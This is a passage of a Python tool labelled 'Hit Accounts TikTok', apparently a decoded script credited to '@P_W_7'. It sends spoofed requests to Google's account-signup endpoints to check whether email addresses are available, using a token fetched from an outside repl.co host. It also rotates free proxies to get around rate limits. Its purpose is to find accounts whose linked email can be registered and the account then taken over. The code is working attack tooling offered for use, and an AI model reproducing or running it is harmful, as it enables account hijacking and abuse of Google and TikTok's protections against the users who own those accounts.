	'user-agent': generate_user_agent()};tokk=requests.get('https://pepperygeneralactionscript.zodhok.repl.co/').text;da=(f'continue=https%3A%2F%2Fwww.google.com%2F&dsh=S1644399110%3A1695515527985204&flowEntry=ServiceLogin&hl=ar&ifkv=AYZoVhctgJglce8ngDS-YYmRkMjKcyuUZeIA6MlKZuxdmLk8INHHJp3tpqbQVyTNKjkpytBw8jTBiw&theme=glif&f.req=%5B%22{tokk}%22%2C%22zaid%22%2C%22ar%22%2C%22zaid%22%2C%22ar%22%2C0%2C0%2Cnull%2Cnull%2C%22web-glif-signup%22%2C0%2Cnull%2C1%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2C1%5D&azt=AFoagUWvOuuV65yGblelgMb8YgqIxqf-PQ%3A1695546705215&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C0%2Cnull%2C0%2C2%2C%22%22%2Cnull%2Cnull%2C0%2C0%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A847%3A1&checkedDomains=youtube&pstMsg=1&]');zaid= requests.post('https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=43956&rt=j',headers=he3,data=da).text;tl=zaid.split('["gf.ttu",null,"')[1].split('"],')[0];url = f'https://accounts.google.com/_/signup/usernameavailability?hl=ar&TL={tl}&_reqid=765070&rt=j';headers={
			'Accept': '*/*',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.9',
			'Content-Length': '898',
			'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
			'Cookie': cokie,
			'Google-Accounts-Xsrf': '1',
			'Origin': 'https://accounts.google.com',
			'Referer': f'https://accounts.google.com/signup/v2/emailsignup?sjid=12488103466622635336-EU&theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
			'Sec-Ch-Ua': '"Not;A=Brand";v="8", "Chromium";v="117", "Google Chrome";v="117"',
			'Sec-Ch-Ua-Arch': '"x86"',
			'Sec-Ch-Ua-Bitness': '"64"',
			'Sec-Ch-Ua-Full-Version': '"117.0.5938.63"',
			'Sec-Ch-Ua-Full-Version-List': '"Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.63", "Google Chrome";v="117.0.5938.63"',
			'Sec-Ch-Ua-Mobile': '?0',
			'Sec-Ch-Ua-Model': '""',
			'Sec-Ch-Ua-Platform': '"Windows"',
			'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
			'Sec-Ch-Ua-Wow64': '?0',
			'Sec-Fetch-Dest': 'empty',
			'Sec-Fetch-Mode': 'cors',
			'Sec-Fetch-Site': 'same-origin',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
			'X-Same-Domain': '1',
		};data={
			'theme': 'glif',
			'continue': 'https://accounts.google.com/ManageAccount?nc=1',
			'f.req': f'["TL:{tl}","{str(email)}",0,0,0,null,0,3508]',
			'at': 'AFoagUU9EVwn5NhOjSbSekGRb853taFYlw:1695481442901',
			'azt': 'AFoagUUmBNb6Od8MKLAz3aR1k7PQTrK84Q:1695481442901',
			'cookiesDisabled': 'false',
			'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
			'gmscoreversion': 'undefined',
			'flowName': 'GlifWebSignIn',
			'checkConnection': 'youtube:671:0',
			'checkedDomains': 'youtube',
			'pstMsg': '1',
		}
	
    		try:
    			rr = requests.post(url,headers=headers,data=data).text
    			#print(rr)
    		except:
    			print('')
    		if '"gf.uar",1,' in rr:
    			yas+=1
    			os.system('cls'if os.name=='net'else'clear')
    			zzod(email)
    			print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
    		else:
    			os.system('cls'if os.name=='net'else'clear')
    			nod+=1
    			#print(zom)
    			print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
    	elif '":{"is_registered":0' in rr:
    		os.system('cls'if os.name=='net'else'clear')
    		no+=1
    		print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
    	else:
    		#print(rr)
    		os.system('clear')

  except:
    pass 
    znoxy()	
	
				
				
#ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ

def znm():
	zom=f"""
{S}{B}{B}Tools {E}[{S}P_W_7{E}] {B}Hit Accounts TikTok 
{B}═════════════════════════════
{S}1 - {F} Check From Followers 
{S}2 - {F} Check From Random
{S}3 - {F} Check Random - Proxy
{B}═════════════════════════════
"""
	print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
	print(zom)
	print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
	try:
		i = int(input(S+'∆ - Write Numper Next : '))
		print('\n')
		print(f'{B}═════════════════════════════')
		if i ==1:
			zod()
		elif i ==2:
			zod2()
		elif i ==3:
			porx=[]
			for za in range(30):
				try:
					pro = requests.get('https://gimmeproxy.com/api/getProxy')
					if '"protocol"' in pro.text or '"ip"' in pro.text or '"port"' in pro.text:
						proxy = str(pro.json()['curl'])
						proto = str(pro.json()['protocol'])
						if 'http' in proxy:
							pro=proxy.split('http://')[1]
							print(pro)
							porx.append(pro)
						else:
							print('')
					else:
						print('')
				except:
					print('')
			
			znoxy(porx)
		else:
			znm()
	except:
		os.system('clear')
		print(f'{S} Error Input :) ')

znm()